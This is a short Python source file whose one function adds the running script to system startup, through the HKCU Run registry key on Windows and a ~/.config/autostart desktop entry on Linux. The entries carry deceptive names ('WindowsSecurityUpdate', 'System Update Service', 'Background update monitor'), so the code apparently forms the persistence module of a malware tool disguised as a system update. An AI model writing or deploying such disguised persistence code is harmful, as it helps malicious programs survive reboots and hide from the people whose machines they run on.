import os
import sys
import platform

def add_to_startup(script_path=None):
    os_name = platform.system()

    if not script_path:
        script_path = os.path.realpath(sys.argv[0])

    if os_name == "Windows":
        try:
            import winreg as reg
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            name = "WindowsSecurityUpdate"
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(reg_key, name, 0, reg.REG_SZ, script_path)
            reg.CloseKey(reg_key)
            print("[✓] Added to startup (Windows)")
        except Exception as e:
            print("[!] Windows autostart failed:", e)

    elif os_name == "Linux":
        try:
            autostart_dir = os.path.expanduser("~/.config/autostart/")
            os.makedirs(autostart_dir, exist_ok=True)
            desktop_entry = f"""
[Desktop Entry]
Type=Application
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Update Service
Comment=Background update monitor
"""
            desktop_file_path = os.path.join(autostart_dir, "systemupdate.desktop")
            with open(desktop_file_path, "w") as f:
                f.write(desktop_entry)
            print("[✓] Added to startup (Linux)")
        except Exception as e:
            print("[!] Linux autostart failed:", e)
